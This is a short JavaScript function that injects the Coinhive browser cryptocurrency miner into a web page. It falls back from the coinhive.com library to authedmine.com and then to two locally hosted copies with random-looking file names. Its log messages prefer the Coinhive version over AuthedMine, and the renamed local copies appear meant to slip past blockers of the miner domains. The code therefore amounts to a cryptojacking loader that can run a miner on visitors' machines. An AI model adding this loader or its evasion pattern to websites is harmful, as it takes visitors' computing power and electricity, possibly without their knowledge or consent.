function loadCoinhive(cb) {
  var script = document.createElement('script');
  script.src = 'https://coinhive.com/lib/coinhive.min.js';
  document.getElementsByTagName("head")[0].appendChild(script);
  //check if script was loaded
  script.onload = function() {
    console.log("Successfully loaded with remote coinhive (not authedmine) script")
    cb();
    return
  }
  //check if it didn't load
  script.onerror = function() {
    var script = document.createElement('script');
    script.src = 'https://authedmine.com/lib/authedmine.min.js';
    document.getElementsByTagName("head")[0].appendChild(script);
    //check if script was loaded
    script.onload = function() {
      console.log("Successfully loaded with remote authedmine script")
      cb();
      return
    }
    //check if it didn't load
    script.onerror = function() {
      var script = document.createElement('script');
      script.src = 'hQxRZwQN.js';
      document.getElementsByTagName("head")[0].appendChild(script);
      //check if script was loaded
      script.onload = function() {
        console.log("Successfully loaded with local coinhive (not authedmine) script")
        cb();
        return
      }
      //check if it didn't load
      script.onerror = function() {
        var script = document.createElement('script');
        script.src = 'By4w79cm.js';
        document.getElementsByTagName("head")[0].appendChild(script);
        //check if script was loaded
        script.onload = function() {
          console.log("Successfully loaded with local authedmine script")
          cb();
          return
        }
        //check if it didn't load
        script.onerror = function() {
          console.log("Failed to load coinhive!")
          cb();
          throw 2;
        }
      }
    }
  }
}
